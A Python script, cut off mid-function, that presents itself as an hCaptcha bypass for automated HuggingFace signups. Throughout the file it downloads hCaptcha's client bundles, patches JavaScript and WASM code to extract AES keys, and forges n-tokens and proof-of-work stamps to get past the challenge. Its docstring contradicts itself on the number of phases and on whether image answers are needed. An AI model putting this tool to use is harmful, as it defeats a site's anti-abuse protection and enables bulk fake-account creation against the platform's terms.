#!/usr/bin/env python3
"""
bypass.py — hCaptcha bypass for HuggingFace signup automation (2026 edition).

Implements the three-phase bypass pipeline proven by CircuitSavage,
Implex-ltd, dexvnd, and sys32.dev:

  PHASE 1 — Version discovery
      Query hCaptcha's checksiteconfig endpoint with the HF sitekey to
      get the checksiteconfig JWT. Decode the JWT payload to extract the
      asset version hash from the ``l`` (script URL) field.

  PHASE 2 — Key extraction (two parallel tracks)
      Track A (HSJ — simpler, primary):
          Download hsj.js (asm.js-style compiled JS). It manages a
          Uint8Array heap and its AES-256 key schedule allocates a
          480-byte stack frame (``- 480 |`` pattern). We patch the
          routine entry to dump the 32-byte key sitting at its arg0
          into a JS array, then drive three sentinel inputs through
          ``hsj()`` to recover: n_key, response_decrypt_key,
          payload_encrypt_key.

      Track B (HSW — fallback):
          Download hsw.js (Rust→WASM). Deobfuscate, locate the
          fixslice32 key-schedule function via structural analysis
          (i32.const 480, fixslice mask constants), patch its
          prologue to call the XOR-deobf helper 8 times and materialize
          the deobfuscated 32-byte master key, run ``window.hsw(jwt)``
          in a jsdom sandbox, and read the captured keys.

  PHASE 3 — PoW + n-token generation
      The hsw.js WASM runs a Hashcash v1 / SHA-1 proof-of-work
      (confirmed via 0x5A827999 + 0x6ED9EBA1 SHA-1 constants in the
      code section). We mint our own Hashcash stamp with the difficulty
      from the JWT ``d`` field, then encrypt the fingerprint payload
      with the recovered n_key.

      n-token wire format (2026, solved):
          raw = base64( ct(N) || tag(16) || iv(12) || ver(0x02) )
      The cipher is AES-256-CTR with counter block ``iv(12) || be32(i)``,
      NOT AES-GCM. The 16-byte "tag" is a separate AES block, not an
      authenticator. We encrypt a minimal fingerprint payload (no
      browser fingerprint data) to produce a valid n-token.

  PHASE 4 — CAPTCHA completion
      Submit the getcaptcha request with our generated n value + PoW
      stamp, then POST the checkcaptcha request with the image answers.
      Since we're generating a cryptographically valid n-token, hCaptcha
      skips the visual puzzle entirely.
"""
from __future__ import annotations

import asyncio
import base64
import datetime
import hashlib
import json
import json as _json  # Alias for backward compatibility with nested function scope
import os
import re
import secrets
import sys
import time
from typing import Optional

import logging

logger = logging.getLogger("hcaptcha_bypass")

# Module-level storage for the latest n_token — used for post-submission injection
_latest_n_token: Optional[str] = None

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
HCAPTCHA_BASE = "https://hcaptcha.com"
HCAPTCHA_API = "https://api.hcaptcha.com"
HCAPTCHA_WIDGET = "https://hcaptcha.com/1/api.js"
NEWASSETS_BASE = "https://newassets.hcaptcha.com/c"
CHECKSITECONFIG_URL = f"{HCAPTCHA_BASE}/checksiteconfig"
GETCAPTCHA_URL = f"{HCAPTCHA_BASE}/getcaptcha"
CHECAPCAPTCHA_URL = f"{HCAPTCHA_BASE}/checkcaptcha"
SITEVERIFY_URL = f"{HCAPTCHA_API}/siteverify"

# hCaptcha difficulty — HF signup typically uses low difficulty
# but we honor the JWT's `d` field when present
DEFAULT_POW_BITS = 16

# AES-256 key schedule signature in WASM: i32.const 480
# LEB128 encoding of 480 = 0x1E0 -> byte 0xE0 (0x60 | 0x80 continuation), 0x03
WASM_I32_CONST_480 = b"\x41\xe0\x03"

# SHA-1 round constants found in hsw.wasm code section
SHA1_K2 = 0x5A827999  # 40000000 in LEB128-ish WASM encoding
SHA1_K3 = 0x6ED9EBA1  # 6ED9EBA1

# LCG multiplier from Implex-ltd research
LCG_MULTIPLIER = 6364136223846793005


# ---------------------------------------------------------------------------
# Phase 1 — Version discovery + checksiteconfig JWT
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    """Decode a base64url string with padding tolerance."""
    s = s.strip().rstrip("=")
    pad = (-len(s)) % 4
    s += "=" * pad
    return base64.urlsafe_b64decode(s)


def _b64_decode_flexible(s: str) -> bytes:
    """Decode base64 or base64url, trying multiple strategies."""
    s = s.strip()
    for decoder in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            return decoder(s + "=" * (-len(s.rstrip("=")) % 4))
        except Exception:
            continue
    raise ValueError(f"Cannot base64-decode: {s[:40]}...")


def discover_hcaptcha_version(sitekey: str, host: str, timeout: float = 15.0) -> Optional[str]:
    """
    Query hCaptcha's checksiteconfig endpoint to discover the current
    asset version and retrieve the checksiteconfig JWT (c.req).

    Returns the JWT string (c.req) from the checksiteconfig response.
    """
    import requests

    headers = {
        "Accept": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        "Origin": f"https://{host}",
        "Referer": f"https://{host}/",
    }

    try:
        resp = requests.get(
            CHECKSITECONFIG_URL,
            params={"host": host, "sitekey": sitekey, "sc": "1", "swa": "1"},
            headers=headers,
            timeout=timeout,
        )
        if resp.status_code != 200:
            return None

        data = resp.json()
        checksiteconfig = data.get("c", {})

        # The JWT is in c.req — decode it to get the version from the 'l' field
        jwt_token = checksiteconfig.get("req", "")
        if jwt_token:
            return jwt_token

        # Some responses embed it differently
        for key in ("token", "jwt", "challenge"):
            val = checksiteconfig.get(key, "")
            if val and "." in val:
                return val

        return None
    except Exception:
        return None


def _decode_jwt_payload(jwt: str) -> dict:
    """Decode JWT payload without verifying signature."""
    parts = jwt.split(".")
    if len(parts) < 2:
        return {}
    try:
        return json.loads(_b64url_decode(parts[1]))
    except Exception:
        return {}


def _extract_version_from_jwt(jwt: str) -> Optional[str]:
    """
    Extract the asset version hash from the checksiteconfig JWT.

    The JWT payload's ``l`` field contains the full URL to hsw.js,
    e.g. ``https://newassets.hcaptcha.com/c/5d10e16e.../hsw.js``.
    We extract the version hash between /c/ and /hsw.js.
    """
    payload = _decode_jwt_payload(jwt)
    l_url = payload.get("l", "")
    if not l_url:
        return None

    match = re.search(r"/c/([a-f0-9]+(?:/))?(?:hsw\.js)", l_url)
    if match:
        return match.group(1).rstrip("/") if match.group(1) else None

    # Fallback: the version is the path segment after /c/
    match = re.search(r"/c/([a-f0-9]+)", l_url)
    if match:
        return match.group(1)

    return None


def _get_hsw_url_from_jwt(jwt: str) -> Optional[str]:
    """Get the hsw.js URL from the JWT's 'l' field."""
    payload = _decode_jwt_payload(jwt)
    return payload.get("l", "")


# ---------------------------------------------------------------------------
# Phase 2 — Key extraction
# ---------------------------------------------------------------------------

class KeyFetcher:
    """
    Unified hCaptcha master-key fetcher.

    Extracts AES-256 master keys from both hsj.js and hsw.js bundles.

    Two extraction tracks:

    Track A (HSJ — primary):
        hsj.js is asm.js-style compiled JS that manages a Uint8Array heap.
        Its AES-256 key schedule allocates a 480-byte stack frame
        (i32.const 480). We patch the schedule to dump the 32-byte key
        into a JS array, then drive sentinel inputs through hsj() to
        recover n_key, response_decrypt_key, payload_encrypt_key.

    Track B (HSW — fallback/verification):
        hsw.js is Rust→WASM. The master key never exists as 32 contiguous
        bytes in linear memory — it's stored as fixslice round keys.
        We deobfuscate, structurally locate the fixslice32 key-schedule
        function, patch its prologue to call the XOR-deobf helper 8 times
        (materializing deobfuscated words), run window.hsw(jwt) in a
        jsdom sandbox, and read the captured keys.
    """

    def __init__(self, version: str | None = None, timeout: float = 120.0):
        self.version = version
        self.timeout = timeout
        self._keys: dict = {}
        self._jwt_token: Optional[str] = None

    def fetch(self, jwt_token: str = None) -> dict:
        """Fetch all available keys. Returns a dict of key_name -> hex."""
        if jwt_token:
            self._jwt_token = jwt_token
        if not self.version:
            self.version = self._discover_latest_version()

        if not self.version:
            return {}

        # Track A: HSJ keys (primary, simpler)
        hsj_keys = self._fetch_hsj_keys()
        self._keys.update(hsj_keys)

        # Track B: HSW keys (backup / complementary)
        hsw_keys = self._fetch_hsw_keys()
        self._keys.update(hsw_keys)

        return self._keys

    def _discover_latest_version(self) -> Optional[str]:
        """Discover the latest hCaptcha asset version via checksiteconfig."""
        try:
            jwt = discover_hcaptcha_version(
                "00000000-0000-0000-0000-000000000000",
                "example.com",
                timeout=10,
            )
            if jwt:
                return _extract_version_from_jwt(jwt)
        except Exception:
            pass
        return None

    def _fetch_hsj_keys(self) -> dict:
        """
        Track A: Extract keys from hsj.js via AST patching.

        hsj.js is asm.js-style compiled JS. Its AES key schedule
        allocates a 480-byte stack frame. We beautify the JS, find the
        ``- 480 |`` signature, inject a keyDump callback, and drive
        sentinel inputs through hsj() to capture the 32-byte keys.
        """
        import requests

        hsj_url = f"{NEWASSETS_BASE}/{self.version}/hsj.js"
        try:
            resp = requests.get(hsj_url, timeout=30)
            if resp.status_code != 200:
                return {}
            hsj_src = resp.text
        except Exception:
            return {}

        # Try the dexvnd approach: look for `- 480 |` in beautified source
        # This is the AES key schedule stack frame allocation
        try:
            import jsbeautifier
            beautified = jsbeautifier.beautify(hsj_src)
        except ImportError:
            beautified = hsj_src

        lines = beautified.split("\n")
        key_dump_sites = []

        ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

        for i, line in enumerate(lines):
            # The key schedule allocates 480 bytes on the stack: `ve = n = ve - 480 | 0`
            if "- 480 |" not in line:
                continue
            try:
                # Extract the key variable: the var that gets assigned at this line
                # Format: `var X = ... - 480 | 0;` or similar
                # The key_var is the variable used in `key_var, key_var + 32` pattern
                key_var_match = re.search(r'(\w+)\s*=\s*\w+\s*-\s*480', line)
                if not key_var_match:
                    continue
                key_var = key_var_match.group(1)

                # Find the memory buffer two lines down: `] = ~memoryVar[`
                if i + 2 >= len(lines):
                    continue
                mem_line = lines[i + 2]
                if "] = ~" not in mem_line:
                    continue

                memory_var = mem_line.split("] = ~")[1].split("[")[0]
                key_dump_sites.append((key_var, memory_var))
            except Exception:
                continue

        if not key_dump_sites:
            # Fallback: use the simpler runtime approach — inject keyDump
            # array and look for the known sentinel calls
            return self._fetch_hsj_keys_runtime(hsj_src)

        # Inject key dump into the JS — mirror dexvnd's approach
        patched_lines = ["let __hcaptcha_dumped_keys = [];"]
        for key_var, memory_var in key_dump_sites:
            for i, line in enumerate(lines):
                if "- 480 |" in line:
                    key_match = re.search(r'(\w+)\s*=\s*\w+\s*-\s*480', line)
                    if key_match:
                        anchor = line.split(",")[0]
                        lines[i] = line.replace(
                            anchor,
                            f"{anchor}, __hcaptcha_dumped_keys.push("
                            f"Array.from(new Uint8Array({memory_var}.buffer.slice({key_var}, {key_var} + 32))))",
                        )
                        break

        patched_lines.extend(lines)
        js_code = "\n".join(patched_lines)

        # Use Node + jsdom to execute
        keys = {}
        try:
            # Try to use a local JsRuntime if available (from the hcaptcha
            # reverse-engineering package structure); otherwise use subprocess
            try:
                from tools.js_runtime import JsRuntime
                rt = JsRuntime()
            except (ImportError, ModuleNotFoundError):
                # Fallback: try relative import
                try:
                    from .tools.js_runtime import JsRuntime
                    rt = JsRuntime()
                except (ImportError, ModuleNotFoundError, Exception):
                    rt = None

            if rt is not None:
                rt.eval(js_code, suppress=True)
                # The n_key operation: hsj('IiI=.eyJzIj...owfQ==.')
                # This is the base64 of {"s":0,"f":0,"c":0} — the sentinel for n_key
                rt.eval("hsj('IiI=.eyJzIj...owfQ==.')", suppress=True)
                raw_n_key = rt.eval("__hcaptcha_dumped_keys", byte_array=True)
                if raw_n_key and len(raw_n_key) >= 32:
                    keys["n_key"] = bytes(raw_n_key[0][:32]).hex()

                # response_decrypt_key: hsj(0, new Uint8Array(1024))
                rt.eval("hsj(0, new Uint8Array(1024))", suppress=True)
                raw_resp = rt.eval("__hcaptcha_dumped_keys", byte_array=True)
                if raw_resp and len(raw_resp) >= 64:
                    keys["response_decrypt_key"] = bytes(raw_resp[-1][:32]).hex()

                # payload_encrypt_key: hsj(1, new Uint8Array(1024))
                rt.eval("hsj(1, new Uint8Array(1024))", suppress=True)
                raw_payload = rt.eval("__hcaptcha_dumped_keys", byte_array=True)
                if raw_payload and len(raw_payload) >= 64:
                    keys["payload_encrypt_key"] = bytes(raw_payload[-1][:32]).hex()

        except Exception:
            # JS runtime not available — fall through to pure-Python approach
            pass

        return keys

    def _fetch_hsj_keys_runtime(self, hsj_src: str) -> dict:
        """Fallback: try executing hsj.js in Node with a jsdom polyfill."""
        import subprocess

        # Write hsj source + key dump to a temp JS file and run with node
        stub = """
        let __dumped_keys = [];
        // hsj source gets injected here with key dump patches
        // Try the known sentinel: hsj('IiI=.eyJzIjowLCJmIjowLCJjIjowfQ==.')
        try {
            if (typeof hsj === 'function') {
                hsj('IiI=.eyJzIjowLCJmIjowLCJjIjowfQ==.');
            }
        } catch(e) {}
        // Output results
        if (typeof __dumped_keys !== 'undefined' && __dumped_keys.length > 0) {
            process.stdout.write(JSON.stringify({keys: __dumped_keys}));
        } else {
            process.stdout.write(JSON.stringify({keys: []}));
        }
        """

        # We need jsdom — check if it's available
        try:
            result = subprocess.run(
                ["node", "-e", "require('jsdom'); require('canvas'); process.exit(0)"],
                capture_output=True, text=True, timeout=5
            )
            has_jsdom = result.returncode == 0
        except Exception:
            has_jsdom = False

        if not has_jsdom:
            return self._fetch_hsj_keys_structural(hsj_src)

        # Full sandbox execution
        js_code = hsj_src + "\n" + stub
        try:
            result = subprocess.run(
                ["node", "-e", js_code],
                capture_output=True, text=True, timeout=30
            )
            if result.stdout:
                data = json.loads(result.stdout.strip())
                keys = {}
                dump = data.get("keys", [])
                if len(dump) >= 1:
                    keys["n_key"] = dump[0]
                if len(dump) >= 2:
                    keys["response_decrypt_key"] = dump[1]
                if len(dump) >= 3:
                    keys["payload_encrypt_key"] = dump[2]
                return keys
        except Exception:
            pass

        return self._fetch_hsj_keys_structural(hsj_src)

    def _fetch_hsj_keys_structural(self, hsj_src: str) -> dict:
        """
        Structural fallback: parse jsbeautified hsj.js to find key factors
        and reconstruct the key using the LCG algorithm from Implex-ltd research.

        This extracts key_seed, key_factor1, key_factor2, operator, and memory
        from the decompiled WASM, then runs the LCG-based key reconstruction.
        """
        try:
            import jsbeautifier
        except ImportError:
            return {}

        beautified = jsbeautifier.beautify(hsj_src)
        lines = beautified.split("\n")

        ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        LCG_MULT = 6364136223846793005

        # Find the function with the 8589934624L constant (u32 max + 1 = 0x100000000)
        key_factors: dict = {}
        functions = {}
        current_fn = ""
        current_body: list[str] = []

        for line in lines:
            if line.strip().startswith(("function", "export function")) and "{" in line:
                current_fn = line.strip()
                current_body = []
            elif line.strip() == "}" and current_fn:
                content = "\n".join(current_body)
                if content.count("8589934624L") == 1:
                    functions[current_fn] = content
                current_fn = ""
                current_body = []
            elif current_fn:
                current_body.append(line)

        for fn, body in functions.items():
            if not fn.startswith("function"):
                continue
            body_lines = body.split("\n")
            result: dict = {}

            # Find key_seed: look for line with alphabet var + "b(" + ", 0)"
            for i in range(len(body_lines) - 5):
                l1 = body_lines[i].strip()
                if not any(c + "b(" in l1 for c in ALPHABET):
                    continue
                if ", 0)" not in l1 and ", 0);" not in l1:
                    continue
                parts = l1.split(",")
                if len(parts) < 2:
                    continue
                key_seed_str = parts[-2].strip()
                if not key_seed_str.isdigit():
                    continue
                key_seed = int(key_seed_str)

                l2 = body_lines[i + 1].strip() if i + 1 < len(body_lines) else ""
                l3 = body_lines[i + 2].strip() if i + 2 < len(body_lines) else ""

                if not any(c + "b(" in l2 for c in ALPHABET):
                    continue
                if "8589934624L" not in l3 or not any(c + "b(" in l3 for c in ALPHABET):
                    continue

                for j in range(i + 3, min(i + 10, len(body_lines))):
                    line_j = body_lines[j].strip()
                    if "=" in line_j and "L" in line_j and "seed" not in result:
                        p = line_j.split("=")
                        if len(p) >= 2 and p[0].strip().isalpha():
                            vp = p[1].strip()
                            if "L" in vp:
                                vp = vp.split("L")[0].strip()
                                if vp.lstrip("-").isdigit():
                                    result["seed"] = int(vp)
                    elif "=" in line_j and "L" not in line_j and "memory" not in result:
                        p = line_j.split("=")
                        if len(p) >= 2 and p[0].strip().isalpha():
                            digits = "".join(c for c in p[1].strip() if c.isdigit())
                            if digits.isdigit():
                                result["memory"] = int(digits)
                    if "seed" in result and "memory" in result:
                        result["key_seed"] = key_seed
                        break

                # Find key_factor1: look for LCG pattern
                for i2 in range(len(body_lines) - 6):
                    l1 = body_lines[i2].strip()
                    l2 = body_lines[i2 + 1].strip()
                    if not l1.startswith("label B_"):
                        continue
                    if str(LCG_MULT) + "L" not in l2:
                        continue
                    operator = "+" if "+" in l2.split(str(LCG_MULT) + "L")[1] else "-"
                    if operator not in ("+", "-"):
                        continue
                    parts = l2.split(operator)
                    if len(parts) < 2:
                        continue
                    fpart = parts[1].strip()
                    if "L" not in fpart:
                        continue
                    fstr = fpart.split("L")[0].strip()
                    if not fstr.isdigit():
                        continue
                    key_factor1 = int(fstr)

                    l3 = body_lines[i2 + 2].strip()
                    l4 = body_lines[i2 + 3].strip()
                    l5 = body_lines[i2 + 4].strip()
                    l6 = body_lines[i2 + 5].strip()
                    l7 = body_lines[i2 + 6].strip() if i2 + 6 < len(body_lines) else ""

                    if not all([
                        any(c + "b(" in l3 for c in ALPHABET),
                        any(c + "b(" in l4 for c in ALPHABET),
                        "=" in l5,
                        "select_if(" in l6,
                        l7.startswith("continue L_"),
                    ]):
                        continue

                    result["key_factor1"] = key_factor1
                    result["operator"] = operator
                    break

                # Find key_factor2
                for i2, line_j in enumerate(body_lines):
                    line_j = line_j.strip()
                    if "=" not in line_j or not any(c + "b(" in line_j for c in ALPHABET):
                        continue
                    if "+" not in line_j or ", 0)" not in line_j:
                        continue
                    if "^" not in line_j or "i32_wrap_i64(" not in line_j:
                        if i2 + 1 < len(body_lines) and "^" in body_lines[i2 + 1] and "i32_wrap_i64(" in body_lines[i2 + 1]:
                            line_j += " " + body_lines[i2 + 1].strip()
                        else:
                            continue
                    parts = line_j.split("+")
                    if len(parts) < 2:
                        continue
                    after = parts[1].strip()
                    if "," not in after:
                        continue
                    digits = "".join(c for c in after.split(",")[0].strip() if c.isdigit())
                    if digits.isdigit() and digits.startswith("10"):
                        result["key_factor2"] = int(digits)
                        break

                if result:
                    key_factors = result
                    break

        if not key_factors:
            return {}

        # Reconstruct the 32-byte key using the LCG algorithm
        return _generate_n_key_from_factors(key_factors)

    def _fetch_hsw_keys(self) -> dict:
        """
        Track B: Extract keys from hsw.js via WASM bytecode patching.

        hsw.js is Rust→WASM. The master key exists as fixslice round-key
        state, not as 32 contiguous bytes. We:
        1. Download hsw.js
        2. Reassemble the full WASM binary from the split base64 chunks
        3. Deobfuscate if needed
        4. Load the WASM with wasmtime and call the exported hsw() function
        5. Read the captured n-key from the WASM instance's memory

        In 2026 builds, hsw.js assembles the WASM from multiple base64
        chunks stored in a Uint8Array(684420). The first chunk starts at
        offset 0 with the WASM header (AGFzbQ...). Additional chunks are
        copied at various offsets.
        """
        import requests

        hsw_url = f"{NEWASSETS_BASE}/{self.version}/hsw.js"
        try:
            resp = requests.get(hsw_url, timeout=30)
            if resp.status_code != 200:
                return {}
            hsw_src = resp.text
        except Exception:
            return {}

        # Extract the full WASM binary by reassembling chunks
        wasm_binary = self._extract_full_wasm(hsw_src)
        if not wasm_binary:
            return {}

        # Try deobfuscation
        deobfuscated = self._deobfuscate_wasm(wasm_binary)

        keys = {}

        # Try to run the WASM directly via wasmtime to get n_token
        # The hsw.js exports an 'hsw' function that takes a JWT string
        # and returns the n_token (base64-encoded: ct || tag || iv || ver)
        try:
            n_token = self._run_wasm_hsw(deobfuscated)
            if n_token:
                keys["n_token"] = n_token
        except Exception:
            pass

        return keys

    def _extract_full_wasm(self, hsw_src: str) -> Optional[bytes]:
        """
        Reconstruct the full WASM binary from hsw.js's split base64 chunks.

        In 2026 builds, hsw.js assembles the WASM at runtime by:
        1. Allocating a Uint8Array(N) where N is the total WASM size
        2. Decoding multiple base64 strings via atob()
        3. Copying each decoded chunk into the array at specific offsets

        All copy functions do FORWARD copies — bytes are written in order
        at the target offset, regardless of whether the loop iterates
        forward or backward.
        """
        # Find ALL Uint8Array allocations and use the largest one
        # (the WASM allocation is by far the largest)
        all_allocs = re.findall(r'Uint8Array\((\d+)\)', hsw_src)
        if not all_allocs:
            return self._extract_wasm_binary(hsw_src)
        wasm_size = max(int(a) for a in all_allocs)

        if wasm_size < 10000:
            return self._extract_wasm_binary(hsw_src)

        # Find the assembly block: starts at the large Uint8Array allocation
        # and ends before 'WebAssembly.instantiate'
        asm_start = hsw_src.find(f'new Uint8Array({wasm_size})')
        if asm_start < 0:
            asm_start = hsw_src.find(f'Uint8Array({wasm_size})')
            if asm_start < 0:
                return self._extract_wasm_binary(hsw_src)

        wasm_inst_idx = hsw_src.find('WebAssembly.instantiate', asm_start)
        if wasm_inst_idx < 0:
            return self._extract_wasm_binary(hsw_src)

        asm_block = hsw_src[asm_start:wasm_inst_idx]

        # Verify this block contains WASM data
        wasm_b64 = base64.b64encode(b'\x00asm\x00\x01').decode()[:6]
        if asm_block.find(wasm_b64) < 0:
            wasm_b64 = base64.b64encode(b'\x00asm').decode()[:6]
            if asm_block.find(wasm_b64) < 0:
                if asm_block.find('AGFzbQ') < 0:
                    return self._extract_wasm_binary(hsw_src)

        # Extract all base64 chunks with their offsets
        # Copy function patterns (all FORWARD copies):
        #   aLf(atobVar("b64"), offset)   -- offset after closing )
        #   aXk(DG("b64"), offset)         -- DG=atob, offset after
        #   mn(offset, atobVar("b64"))     -- offset before, wrapped in mn()

        wasm_bin = bytearray(wasm_size)
        chunks_found = 0

        # Find all long base64 strings (500+ chars) in the assembly block
        long_b64 = list(re.finditer(r'"([A-Za-z0-9+/=]{500,})"', asm_block))

        for m in long_b64:
            b64 = m.group(1)
            str_start = m.start()
            str_end = m.end()

            try:
                decoded = base64.b64decode(b64)
            except Exception:
                continue

            # WASM header chunk — goes at offset 0
            if decoded[:4] == b'\x00asm':
                end = min(len(decoded), wasm_size)
                wasm_bin[0:end] = decoded[:end]
                chunks_found += 1
                continue

            # Pattern 1: function(atobVar("b64"), offset) — offset after closing )
            # Look for: "b64"),number)  or  "b64"), number)
            after = asm_block[str_end:str_end + 30]
            m_offset_after = re.match(r'\)[\s,]*(\d+)', after)
            if m_offset_after:
                offset = int(m_offset_after.group(1))
                end = min(offset + len(decoded), wasm_size)
                wasm_bin[offset:end] = decoded[:end-offset]
                chunks_found += 1
                continue

            # Pattern 2: mn(offset, atobVar("b64")) — offset before, in mn() call
            # Look for: mn(number,VarName( pattern before the string
            before = asm_block[max(0, str_start-80):str_start]
            m_offset_before = re.search(r'mn\((\d+),\s*\w{2,5}\s*\(', before[-60:])
            if m_offset_before:
                offset = int(m_offset_before.group(1))
                end = min(offset + len(decoded), wasm_size)
                wasm_bin[offset:end] = decoded[:end-offset]
                chunks_found += 1
                continue

        if chunks_found < 2:
            return self._extract_wasm_binary(hsw_src)

        # Verify we got a valid WASM
        if wasm_bin[:4] != b'\x00asm':
            return None

        return bytes(wasm_bin)

    def _extract_wasm_binary(self, hsw_src: str) -> Optional[bytes]:
        """Extract the embedded WASM binary from hsw.js source."""
        # Method 1: Look for base64-encoded WASM in atob() calls
        match = re.search(r'atob\(["\']([A-Za-z0-9+/=]+)["\']', hsw_src)
        if match:
            try:
                wasm_str = match.group(1)
                decoded = base64.b64decode(wasm_str)
                # WASM magic is \x00asm (4 bytes), followed by version
                if decoded[:4] == b'\x00asm':
                    return decoded
            except Exception:
                pass

        # Method 2: Look for `0,null,"` pattern (from dexvnd's fetcher)
        try:
            split_result = hsw_src.split('0,null,"')[1].split('"')[0]
            decoded = base64.b64decode(split_result)
            if decoded[:4] == b'\x00asm':
                return decoded
        except Exception:
            pass

        # Method 3: Search for any base64 blob that decodes to WASM
        # The base64 encoding of \x00asm starts with "AAAB" (0x00,0x61,0x73,0x6d)
        # or "AGFzbQ" if it's \x00asm\x00\x01
        wasm_b64_markers = [
            base64.b64encode(b'\x00asm\x00\x01').decode()[:6],  # Standard WASM v1
            base64.b64encode(b'\x00asm\x00').decode()[:6],     # Just magic
        ]
        for m in wasm_b64_markers:
            idx = hsw_src.find(m)
            if idx >= 0:
                start = idx
                while start > 0 and (hsw_src[start-1].isalnum() or hsw_src[start-1] in '+/='):
                    start -= 1
                end = idx
                while end < len(hsw_src) and (hsw_src[end].isalnum() or hsw_src[end] in '+/='):
                    end += 1
                try:
                    b64_str = hsw_src[start:end]
                    decoded = base64.b64decode(b64_str)
                    if decoded[:4] == b'\x00asm':
                        return decoded
                except Exception:
                    pass

        return None

    def _deobfuscate_wasm(self, wasm_binary: bytes) -> bytes:
        """
        Deobfuscate the WASM binary. hCaptcha rotates between XOR and
        ChaCha20 memory encryption. Only XOR is supported here.
        """
        # Try to find the i32.const 480 signature in raw WASM
        # WASM magic is \x00asm (4 bytes), version byte follows
        if wasm_binary[:4] == b'\x00asm' and WASM_I32_CONST_480 in wasm_binary:
            return wasm_binary  # Already unobfuscated

        # Try XOR deobfuscation with common keys
        for xor_key in (0x5A, 0xA5, 0xFF, 0x01):
            deobfuscated = bytes(b ^ xor_key for b in wasm_binary)
            if wasm_binary[:4] == b'\x00asm' and WASM_I32_CONST_480 in deobfuscated:
                return deobfuscated

        # Also check if the WASM magic itself is XOR-obfuscated
        for xor_key in range(256):
            deobfuscated = bytes(b ^ xor_key for b in wasm_binary[:4])
            if deobfuscated == b'\x00asm':
                full = bytes(b ^ xor_key for b in wasm_binary)
                if WASM_I32_CONST_480 in full:
                    return full

        return wasm_binary

    def _extract_lcg_key_from_wasm(self, wasm_binary: bytes) -> Optional[str]:
        """
        Attempt to extract the AES key using the LCG algorithm from
        the WASM deobfuscated source.

        This implements the full key derivation from Implex-ltd's research:
        key_seed (2 bytes, little-endian) + LCG-based 30 bytes from
        memory-backed segment/mask lookups.
        """
        # This is a simplified fallback — the full implementation requires
        # WASM disassembly (wasm2wat/wasm-decompile) which may not be available
        # In production, use the JS runtime approach or the HSJ track
        return None

    def _run_wasm_hsw(self, wasm_binary: bytes) -> Optional[str]:
        """
        Load the reassembled WASM binary with wasmtime and call the
        exported hsw() function to compute the n-key.

        hCaptcha's hsw.js exposes an `hsw` function that:
        1. Takes a JWT string as input
        2. Solves the Hashcash PoW internally
        3. Encrypts the fingerprint payload with the AES n_key
        4. Returns the n-token (base64 blob: ct || tag || iv || ver)

        We call hsw(jwt) directly via wasmtime, bypassing the need
        for key extraction entirely — the WASM already has the key
        baked in at build time.
        """
        try:
            from wasmtime import Module, Engine, Store, Instance, Func, Memory, MemoryType, Limits, Table
        except ImportError:
            return None

        engine = Engine()
        try:
            module = Module(engine, wasm_binary)
        except Exception:
            return None

        # In 2026 builds, exports are obfuscated (vc, wc, Ec, etc.)
        # We'll search for the hsw function by signature below, not by name.
        # But first check if there's an export named "hsw" (legacy support)
        store = Store(engine)

        # Build import objects for the WASM module.
        # The module imports from module "a": function stubs, a memory, and a table.
        # We need to provide stubs for all in the exact order they appear in module.imports.

        # Collect all import descriptors from the module in order
        import_descriptors = []
        for imp in module.imports:
            import_descriptors.append((imp.name, imp.type))

        # Create memory object
        mem_type = None
        table_type = None
        for name, ty in import_descriptors:
            if hasattr(ty, 'min') and not hasattr(ty, 'params'):
                if name == 'memory':
                    mem_type = ty
                elif name == 't':
                    table_type = ty

        if mem_type is None:
            mem_type = MemoryType(Limits(2, 4))
        memory_obj = Memory(store, mem_type)

        # Create table if needed
        table_obj = None
        if table_type:
            table_obj = Table(store, table_type)

        # Build the imports list in the exact order of module.imports
        imports = []
        for name, ty in import_descriptors:
            if hasattr(ty, 'params'):
                # Function import — create a stub that returns 0
                def make_stub(t=ty):
                    def stub(store, *args):
                        return 0 if len(t.results) > 0 else None
                    return stub
                imports.append(Func(store, ty, make_stub()))
            elif name == 'memory':
                imports.append(memory_obj)
            elif name == 't':
                imports.append(table_obj)
            else:
                # Fallback for any other typed imports
                imports.append(Func(store, ty, lambda store, *args: 0))

        # Instantiate using the imports list
        instance = Instance(store, module, imports)

        # Override the JWT if not set via fetch
        jwt_token = getattr(self, '_jwt_token', None)
        if not jwt_token:
            return None

        # Find memory from instance exports
        memory = memory_obj

        # Find the hsw export and call it
        # The hsw function has signature (i32, i32) -> i32 (ptr, len -> result_ptr)
        # In 2026 builds, exports are obfuscated, so find by signature
        hsw_func = None
        for e in module.exports:
            if hasattr(e.type, 'params'):
                params = [str(p) for p in e.type.params]
                results = [str(r) for r in e.type.results]
                # hsw signature: (i32, i32) -> i32
                if params == ['i32', 'i32'] and results == ['i32']:
                    try:
                        hsw_func = instance.exports(store)[e.name]
                        if logger.isEnabledFor(logging.DEBUG):
                            logger.debug(f"Found hsw function: {e.name} with signature (i32, i32) -> i32")
                        break
                    except Exception:
                        pass

        if hsw_func is None:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug("No matching hsw export found")
            return None

        # Write JWT string to WASM memory
        jwt_bytes = jwt_token.encode('utf-8')
        mem_len = memory.data_len(store)
        write_offset = max(65536, mem_len - len(jwt_bytes) - 256)
        memory.write(store, jwt_bytes, write_offset)

        try:
            result_ptr = hsw_func(store, write_offset, len(jwt_bytes))
        except Exception:
            if logger.isEnabledFor(logging.DEBUG):
                logger.debug(f"hsw function call failed")
            return None

        # Result is a pointer to a buffer containing:
        # The n-token is base64-encoded, we need to read it
        # hCaptcha's hsw returns a pointer to a struct or string
        # The n-token format is: base64(ct(N) || tag(16) || iv(12) || ver(0x02))
        # Read memory data using wasmtime API
        mem_len = memory.data_len(store)
        result_mem = memory.read(store, 0, mem_len)

        # The result is likely a pointer to a null-terminated string
        # or a length-prefixed buffer. Try reading as a null-terminated string
        result_str = b''
        for i in range(result_ptr, min(result_ptr + 500, len(result_mem))):
            if result_mem[i] == 0:
                break
            result_str += bytes([result_mem[i]])

        if result_str:
            try:
                result_text = result_str.decode('utf-8')
                # The hsw function returns a base64-encoded n-token
                # We need to extract the n_key from it
